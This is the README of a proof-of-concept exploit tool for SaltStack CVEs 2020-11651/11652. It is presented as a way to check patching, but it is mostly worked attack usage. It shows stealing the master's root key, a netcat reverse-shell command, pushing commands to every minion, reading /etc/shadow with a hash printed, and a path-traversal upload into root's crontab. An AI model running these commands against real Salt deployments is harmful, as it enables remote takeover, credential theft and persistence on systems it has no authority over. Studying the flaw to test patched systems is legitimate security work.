# PoC exploit for CVE-2020-11651 and CVE-2020-11652

This is a proof of concept exploit based on the initial [check script](https://github.com/rossengeorgiev/salt-security-backports).
Use it to verify you have successfully updated your Salt master servers to a [release containing the required fixes](https://help.saltstack.com/hc/en-us/articles/360043056331-New-SaltStack-Release-Critical-Vulnerability).

Thanks for F-Secure Labs for their [research and reporting](https://labs.f-secure.com/advisories/saltstack-authorization-bypass/).

Currently this script can be used for filesystem access and scheduling commands on the master and all connected minions. Use these powers wisely!

## Usage

Default operation (without arguments) is to obtain the root key for the given master:

```
root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
root@kalimah:~/salt#
```

Executing arbitrary commands on the master:

```
root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec "nc 127.0.0.1 4444 -e /bin/sh"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130
[+] Successfully scheduled job: 20200504153851746472
root@kalimah:~/salt#
```

The same, but on all minions:

```
root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all="apt-get upgrade -y"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[!] Lester, is this what you want? Hit ^C to abort.
[+] Attemping to execute 'apt-get upgrade -y' on all minions connected to 192.168.115.130
[+] Successfully submitted job to all minions.
root@kalimah:~/salt#
```

Files can be read with:

```
root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow
[+] Salt version: 2019.2.0
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[+] Attemping to read /etc/shadow from 192.168.115.130
root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::
daemon:*:17785:0:99999:7:::
bin:*:17785:0:99999:7:::
sys:*:17785:0:99999:7:::
sync:*:17785:0:99999:7:::
games:*:17785:0:99999:7:::
man:*:17785:0:99999:7:::
[...]
```

Files can be uploaded using `--upload-src` and `--upload-dest`. Note the destination must be a relative path:


```
root@kalimah:~/salt#  python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root
[+] Salt version: 2019.2.0
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[-] Destination path must be relative
[+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1
[ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root
```

## Requirements

- Python 2 or 3
- Salt (`pip3 install salt`)
